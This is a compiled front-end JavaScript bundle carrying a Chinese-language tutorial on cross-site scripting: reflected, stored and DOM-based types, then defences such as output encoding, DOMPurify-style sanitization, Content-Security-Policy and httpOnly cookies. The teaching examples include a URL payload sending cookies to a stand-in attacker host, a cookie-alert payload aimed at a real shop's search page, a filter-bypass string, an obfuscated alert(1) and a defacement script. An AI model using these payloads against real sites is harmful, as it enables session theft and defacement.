(window.webpackJsonp=window.webpackJsonp||[]).push([[65],{635:function(t,s,a){"use strict";a.r(s);var e=a(15),r=Object(e.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("p",[t._v("前端最需要知道的資訊安全 - XSS 攻擊，若這道防線被破了，CSRF 相關防範措施就會失效，這次就來紀錄一下什麼是 XSS 攻擊，以及他的防禦方式。")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://storage.googleapis.com/image.blocktempo.com/2021/08/Source%EF%BC%9ASimplilearn-.jpg",alt:""}})]),t._v(" "),a("p",[t._v("Cross Site Scripting 是一種網站應用程序的安全漏洞攻擊，是代碼注入的一種。它允許惡意用戶將代碼注入到網頁上，其他用戶在觀看網頁時就會受到影響。這類攻擊通常包含了 HTML 以及用戶端腳本語言。")]),t._v(" "),a("h2",{attrs:{id:"攻擊原理"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#攻擊原理"}},[t._v("#")]),t._v(" 攻擊原理")]),t._v(" "),a("p",[t._v("在前端 Web 的環境下，最容易也最常被提及的攻擊就是 XSS 了。駭客利用在輸入框等欄位，輸入惡意的程式碼，剛好網站又沒有經過驗證，就直接執行輸出，導致惡意的程式碼被執行。")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://i.imgur.com/yumObbV.png",alt:""}})]),t._v(" "),a("p",[t._v("大致上主要分為下列三種攻擊模式：")]),t._v(" "),a("ol",[a("li",[t._v("Reflective XSS")]),t._v(" "),a("li",[t._v("Persistent/Stored XSS")]),t._v(" "),a("li",[t._v("Dom-based XSS")])]),t._v(" "),a("h3",{attrs:{id:"_1-reflective-xss"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-reflective-xss"}},[t._v("#")]),t._v(" 1. Reflective XSS")]),t._v(" "),a("p",[t._v("駭客會利用網址參數地方，輸入惡意的程式碼，當受害者透過該網址打開網站時，就會立刻執行，有點像反射的感覺，所以叫 Reflective XSS。惡意植入程式碼的網址大概長這樣：")]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("http://www.shop.com/search?query=<script>document.location='http://badguy.com/cookiestealer.php?c='+document.cookie;<\/script>\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("利用網址參數的特性，有可能會在網站上執行，駭客在上面輸入的不是正常的字串，而是 Javascript 執行片段，這樣一來，當點擊該網址，駭客就可以輕易地拿到 Cookie、token 等相關資料。")]),t._v(" "),a("h4",{attrs:{id:"攻擊概念圖"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#攻擊概念圖"}},[t._v("#")]),t._v(" 攻擊概念圖：")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://i.imgur.com/o0V3T19.jpg",alt:""}})]),t._v(" "),a("h3",{attrs:{id:"_2-persistent-stored-xss"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-persistent-stored-xss"}},[t._v("#")]),t._v(" 2. Persistent/Stored XSS")]),t._v(" "),a("p",[t._v("駭客利用網站資料庫儲存惡意的程式碼，當被害者開啟網站，網站透過請求載入資料庫內容，導致惡意程式碼被執行，若資料庫沒有刪除該資料是可以永久生效的，因此稱為 Persistent/Stored XSS，常見的方式為留言區塊或評論區塊。")]),t._v(" "),a("h4",{attrs:{id:"攻擊概念圖-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#攻擊概念圖-2"}},[t._v("#")]),t._v(" 攻擊概念圖：")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://i.imgur.com/UNga1jE.jpg",alt:""}})]),t._v(" "),a("h3",{attrs:{id:"_3-dom-based-xss"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-dom-based-xss"}},[t._v("#")]),t._v(" 3. Dom-based XSS")]),t._v(" "),a("p",[t._v("網站在執行的過程中，因為 DOM 中有被植入惡意程式碼，當 DOM 被操作了之後，就會執行惡意程式碼，導致攻擊發生。這種攻擊，因為沒有涉及後端驗證，所以需要前端去做防範。")]),t._v(" "),a("p",[t._v("例如只要有輸入 innerHtml 的地方，駭客就可以利用這個方式輸入帶有 script 的 img 標籤，並且隱藏起來，這樣一來就可以駭客就可以對網站資源予取予求。")]),t._v(" "),a("h4",{attrs:{id:"攻擊概念圖-3"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#攻擊概念圖-3"}},[t._v("#")]),t._v(" 攻擊概念圖：")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://i.imgur.com/l6l03T3.jpg",alt:""}})]),t._v(" "),a("h2",{attrs:{id:"攻擊示範"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#攻擊示範"}},[t._v("#")]),t._v(" 攻擊示範")]),t._v(" "),a("h3",{attrs:{id:"_1-cookie-theft"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-cookie-theft"}},[t._v("#")]),t._v(" 1. Cookie Theft")]),t._v(" "),a("p",[t._v("假設你的 email 收到一個連結：")]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("https://shopee.tw/search?query=<script>alert(document.cookie);<\/script>\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("看到網址前面是平常在逛網站，就不疑有他，直接點進去，剛好網站的防禦有漏洞，而因為是搜尋物件的 https 請求，會執行網址後面的參數，駭客在那邊不是寫入正常的字串，而是 script 片段，就可以盜取網站的 cookie、密碼等機密資訊。")]),t._v(" "),a("p",[t._v("甚至是不給你看到連結，就給你一個 a 標籤，上面顯示一些可以讓人點擊的資訊，也會造成攻擊。")]),t._v(" "),a("h3",{attrs:{id:"_2-釣魚網站"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-釣魚網站"}},[t._v("#")]),t._v(" 2. 釣魚網站")]),t._v(" "),a("p",[t._v("相信大家都有這樣的經驗，點擊到某個網站後，突然顯示你中獎了，輸入資訊就可以抽 iphone、switch 等大獎，其實就是很常見的釣魚手法，駭客利用人貪小便宜的心理，就輸入了自己的信箱、手機號碼等資訊，日後他可以透過這些資訊傳惡意連結等，讓你在不經意點擊上鉤。")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://i.imgur.com/RRy8EdH.jpg",alt:""}})]),t._v(" "),a("p",[a("img",{attrs:{src:"https://i.imgur.com/nPSXRIZ.jpg",alt:""}})]),t._v(" "),a("p",[t._v("前陣子，手機的行事曆也被攻擊，點擊網站後，他在手機行事曆植入一堆待辦訊息，每天都會彈出來顯示手機中毒，點擊進去查看解決方式等，類似誘發人們點擊的攻擊。")]),t._v(" "),a("h3",{attrs:{id:"_3-inline-script"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-inline-script"}},[t._v("#")]),t._v(" 3. inline Script")]),t._v(" "),a("p",[t._v("在網站上，插入奇怪的元素，導致執行惡意的程式碼，輕則讓網站無法使用，嚴重點是可以盜取信用卡、密碼等資料。")]),t._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("scritp"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("var")]),t._v(" data "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("''")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("var")]),t._v(" i "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" i "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("100")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" i"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("++")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    data "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"<marquee><blink>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    data "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Websit is down"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    data "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"</blink></marquee>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n\n  document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("body"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("innerHtml "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("data "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('""')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br"),a("span",{staticClass:"line-number"},[t._v("10")]),a("br")])]),a("h2",{attrs:{id:"為什麼駭客可以這麼輕易的執行惡意程式碼在網站上"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#為什麼駭客可以這麼輕易的執行惡意程式碼在網站上"}},[t._v("#")]),t._v(" 為什麼駭客可以這麼輕易的執行惡意程式碼在網站上？")]),t._v(" "),a("p",[t._v("同源政策的漏洞，駭客插入的惡意程式碼，會被視為跟你的程式碼「同 Origin」，因此你的網站便不再受到 Same Origin Policy 的保護。也就是說，網站會把惡意程式碼看做與普通程式碼有相同的權限，因此一般程式碼能做到的事，惡意程式碼也可以，而且如果被 XSS 攻擊了，CSRF 相關的保護也會失效，所以前端最最重要的就是在 XSS 的防禦上，那要如何防禦呢？")]),t._v(" "),a("h2",{attrs:{id:"如何防禦-xss-攻擊"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#如何防禦-xss-攻擊"}},[t._v("#")]),t._v(" 如何防禦 XSS 攻擊？")]),t._v(" "),a("h3",{attrs:{id:"不好的防禦姿勢"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#不好的防禦姿勢"}},[t._v("#")]),t._v(" 不好的防禦姿勢：")]),t._v(" "),a("p",[t._v("既然 XSS 攻擊是透過使用者輸入、伺服器回傳等方式植入惡意的程式碼來執行，那只要前端在執行這些來源時，就都判斷是否帶有 script 標籤不就可以防範 XSS 攻擊了嗎？如果是這樣想，其實也沒有錯，但是駭客卻往往想得比你更深，因為你只在第二層。")]),t._v(" "),a("p",[t._v("比如駭客輸入這樣的字串：")]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("<scr<script>ipt>bad code</<scr<\/script>pt>>\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("當你將特定字串「"),a("code",[t._v("<script>")]),t._v("」以及「"),a("code",[t._v("<\/script>")]),t._v("」過濾掉後，剛好顯示出攻擊的字串。")]),t._v(" "),a("p",[t._v("或是透過編碼的方式來讓你猜不出來。")]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v('""[(!1+"")[3]+(!0+"")[2]+(\'\'+{})[2]][(\'\'+{})[5]+(\'\'+{})[1]+((""[(!1+"")[3]+(!0+"")[2]+(\'\'+{})[2]])+"")[2]+(!1+\'\')[3]+(!0+\'\')[0]+(!0+\'\')[1]+(!0+\'\')[2]+(\'\'+{})[5]+(!0+\'\')[0]+(\'\'+{})[1]+(!0+\'\')[1]](((!1+"")[1]+(!1+"")[2]+(!0+"")[3]+(!0+"")[1]+(!0+"")[0])+"(1)")()\n')])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("義同於")]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("alert(1)\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("h3",{attrs:{id:"正確的防禦姿勢"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#正確的防禦姿勢"}},[t._v("#")]),t._v(" 正確的防禦姿勢：")]),t._v(" "),a("p",[t._v("以下有幾種方式：")]),t._v(" "),a("h3",{attrs:{id:"_1-contextual-output-encoding"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-contextual-output-encoding"}},[t._v("#")]),t._v(" 1. Contextual Output Encoding")]),t._v(" "),a("p",[t._v("那我們把惡意的 script 變成單純不能執行的字串就好了，這樣不就可以讓攻擊失效了嗎？\n根據情境，將來源編碼，即使是惡意的程式碼也會變成非程式碼。")]),t._v(" "),a("h4",{attrs:{id:"編碼轉換"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#編碼轉換"}},[t._v("#")]),t._v(" 編碼轉換")]),t._v(" "),a("p",[t._v("開發時，多多少少應該都有用過一些編碼的方式來顯示字串在畫面上，避免被瀏覽器判斷成標籤，最常用到的就是空白（"),a("code",[t._v("&nbsp")]),t._v("），以下簡單列出幾種：")]),t._v(" "),a("ul",[a("li",[a("code",[t._v("&")]),t._v(" 轉換成 "),a("code",[t._v("&amp")]),t._v("。")]),t._v(" "),a("li",[a("code",[t._v("<")]),t._v(" 轉換成 "),a("code",[t._v("&lt")]),t._v("。")]),t._v(" "),a("li",[a("code",[t._v(">")]),t._v(" 轉換成 "),a("code",[t._v("&gt")]),t._v("。")]),t._v(" "),a("li",[a("code",[t._v("“")]),t._v(" 轉換成 "),a("code",[t._v("&quot")]),t._v("。")]),t._v(" "),a("li",[a("code",[t._v("‘")]),t._v(" 轉換成 "),a("code",[t._v("&#x27")]),t._v("。")]),t._v(" "),a("li",[a("code",[t._v("/")]),t._v(" 轉換成 "),a("code",[t._v("&#x2F")]),t._v("。")])]),t._v(" "),a("p",[t._v("透過這樣的原理，用字元轉換的方式來顯示不想被瀏覽器判斷的符號，很多函式庫也都支持這樣的方式來轉換。")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://i.imgur.com/BS0MvTZ.png",alt:""}})]),t._v(" "),a("p",[t._v("由圖可以知道，右邊的開發者工具看到的其實是已經編碼的字串，但是瀏覽器會解析成相關字元顯示在網頁上。許多框架都已經內建了 XSS 的防範機制，例如 React 的 JSX 就會在渲染前把內容都轉換成字串，Java 也有 OWASP Java Encoder Project 函式庫來避免這樣的攻擊。")]),t._v(" "),a("h4",{attrs:{id:"各種情境"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#各種情境"}},[t._v("#")]),t._v(" 各種情境")]),t._v(" "),a("p",[t._v("不同的情境，編碼的方式都不太一樣，以下列出五種攻擊情境：")]),t._v(" "),a("ol",[a("li",[t._v("HTML Entity Context：在 HTML 中植入 script 字串而被執行。")]),t._v(" "),a("li",[t._v("HTML Attributes Context：在 DOM 的屬性上，不是寫入字串，而是惡意程式碼。")]),t._v(" "),a("li",[t._v("URL Fragment Context：網址參數被竄改。")]),t._v(" "),a("li",[t._v("Script Context：inline script。")]),t._v(" "),a("li",[t._v("Style Context：inline css。")])]),t._v(" "),a("p",[t._v("以上就是 Contextual Output Encoding 的方法，但這種方式有一個缺點，如果網站有讓使用者自行編輯樣式，或撰寫功能的話，就無法實現了。")]),t._v(" "),a("h3",{attrs:{id:"_2-html-sanitization"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-html-sanitization"}},[t._v("#")]),t._v(" 2. HTML Sanitization")]),t._v(" "),a("p",[t._v("基於 Contextual Output Encoding 的缺點，那只要過濾惡意的程式碼，讓他變成安全的程式碼就可以了。這時候就有了 HTML Sanitization 這樣的方法來針對 XSS 攻擊做防範。")]),t._v(" "),a("p",[t._v("以下是幾個 HTML Sanitization 的專案：")]),t._v(" "),a("ul",[a("li",[t._v("JavaScript :https://github.com/cure53/DOMPurify")]),t._v(" "),a("li",[t._v("Python :https://pypi.python.org/pypi/bleach")]),t._v(" "),a("li",[t._v("Java(OWASP_Java_HTML_Sanitizer_Project) :https://www.owasp.org/index.php")])]),t._v(" "),a("p",[t._v("但是還是有過濾不乾淨的案例發生。")]),t._v(" "),a("h3",{attrs:{id:"_3-dom-based-xss-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-dom-based-xss-2"}},[t._v("#")]),t._v(" 3. DOM-based XSS")]),t._v(" "),a("p",[t._v("DOM-based，其實就是靠 Javascript 本來的函式來區分，注意哪些函式屬於危險函式，哪些是安全的函式，而危險函式是指會觸發瀏覽器執行相關程式碼的寫入或是直接執行的類型。")]),t._v(" "),a("p",[t._v("危險的方法：")]),t._v(" "),a("table",[a("thead",[a("tr",[a("th",[t._v("類型")]),t._v(" "),a("th",[t._v("相關方法")])])]),t._v(" "),a("tbody",[a("tr",[a("td",[t._v("直接會被執行的函式")]),t._v(" "),a("td",[t._v("eval()、window.execScript()、setInterval()、setTimeout()、requestAnimationFrame()、IIFE")])]),t._v(" "),a("tr",[a("td",[t._v("更改畫面元素，瀏覽器會判斷是否為程式碼執行")]),t._v(" "),a("td",[t._v("document.write()、innerHTML、outterHTML、危險的 setAttribute(src、href、onClick、onblur...)")])]),t._v(" "),a("tr",[a("td",[t._v("方法中執行")]),t._v(" "),a("td",[t._v("onclick()、onblur()、onload()...etc")])])])]),t._v(" "),a("p",[t._v("安全的方法：")]),t._v(" "),a("table",[a("thead",[a("tr",[a("th",[t._v("類型")]),t._v(" "),a("th",[t._v("相關方法")])])]),t._v(" "),a("tbody",[a("tr",[a("td",[t._v("更改畫面元素類型")]),t._v(" "),a("td",[t._v('textContent = ""、className = ""、安全的 setAttribute(key="", name="")、createTextNode("")、、')])])])]),t._v(" "),a("p",[t._v("這種方法要防禦的話就要靠平常工程師撰寫程式碼的功力了，要注意到資安又要實現功能。但大部分的開發者，由於專案的進度，都不會很專注在 DOM-based 的防禦上，還是要靠一些瀏覽器的設定，或是函式庫的輔助來達到防禦效果，下面就來介紹靠瀏覽器就可以減少這樣攻擊的方法。")]),t._v(" "),a("h3",{attrs:{id:"_4-瀏覽器的-xss-防禦手法"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_4-瀏覽器的-xss-防禦手法"}},[t._v("#")]),t._v(" 4. 瀏覽器的 XSS 防禦手法")]),t._v(" "),a("h4",{attrs:{id:"x-xss-protection"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#x-xss-protection"}},[t._v("#")]),t._v(" X-Xss-Protection")]),t._v(" "),a("p",[t._v("在 http response header 中設定 X-Xss-Protection 的防護功能。目前大部分瀏覽器都已經支援了，若是偵測到可疑的程式碼就會自動擋下來。")]),t._v(" "),a("p",[t._v("設定方式為：")]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("X-Xss-Protection: 1; mode=block\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("很多伺服器或是框架等，都有支持這樣的設定了。")]),t._v(" "),a("h4",{attrs:{id:"content-security-policy"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#content-security-policy"}},[t._v("#")]),t._v(" Content-Security-Policy")]),t._v(" "),a("p",[t._v("設定白名單，讓可以執行的程式碼執行。Content-Security-Policy 是透過規則來規定瀏覽器行為的方法，其中可以透過 script-src 這個屬性來設定程式碼的來源，若符合則可以執行。")]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("Content-Security-Policy: script-src 'self' 'nonce-2726c7f26c'\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("self 是指同源的程式碼，以及標記 "),a("code",[t._v("key/value")]),t._v(" 為 "),a("code",[t._v("nonce/2726c7f26c")]),t._v(" 的 inline script 的程式碼可以被執行。")]),t._v(" "),a("div",{staticClass:"language-htmlmixed line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v('<script nonce="2726c7f26c">\n  var inline = 1;\n<\/script>\n')])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br")])]),a("h3",{attrs:{id:"_5-cookies-保護"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_5-cookies-保護"}},[t._v("#")]),t._v(" 5. Cookies 保護")]),t._v(" "),a("p",[t._v("伺服器的資訊，能不被程式碼讀取就盡量不要，可以透過設定 httpOny 來讓客戶端的程式碼無法讀取相關 cookie 內容。同時，設定 secure 可以限定 cookie 在 https 的協議下才能傳送，更多一層保護。")]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("Set-Cookie: NAME=VALUE; expires=EXPIRES; path=PATH; domain=DOMAIN; secure; httponly;\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("h2",{attrs:{id:"結論"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#結論"}},[t._v("#")]),t._v(" 結論")]),t._v(" "),a("p",[t._v("以上，我們可以知道 XSS 攻擊都是使用者操作下，無意間執行惡意程式碼導致的。因此，即使是在前端，對於欄位的驗證、參數的判斷，都要先做好一層防護。雖然前端保護力有限，透過與後端的配合，才能有效減少這類的攻擊。")]),t._v(" "),a("h6",{attrs:{id:"參考"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#參考"}},[t._v("#")]),t._v(" 參考")]),t._v(" "),a("ol",[a("li",[a("a",{attrs:{href:"https://ithelp.ithome.com.tw/m/articles/10217074",target:"_blank",rel:"noopener noreferrer"}},[t._v("資安百物語"),a("OutboundLink")],1)]),t._v(" "),a("li",[a("a",{attrs:{href:"https://ithelp.ithome.com.tw/articles/10218476",target:"_blank",rel:"noopener noreferrer"}},[t._v("Web Security - A7 . Cross-Site Scripting (XSS)"),a("OutboundLink")],1)]),t._v(" "),a("li",[a("a",{attrs:{href:"https://hahow.in/courses/5aca2dc9d21aee001e55b296/main?item=5accfb00d21aee001e55d005",target:"_blank",rel:"noopener noreferrer"}},[t._v("經典駭客攻擊教程：給每個人的網站安全入門"),a("OutboundLink")],1)]),t._v(" "),a("li",[a("a",{attrs:{href:"https://www.softwaretestinghelp.com/cross-site-scripting-xss-attack-test/",target:"_blank",rel:"noopener noreferrer"}},[t._v("Cross Site Scripting (XSS) Attack Tutorial With Examples, Types & Prevention"),a("OutboundLink")],1)])])])}),[],!1,null,null,null);s.default=r.exports}}]);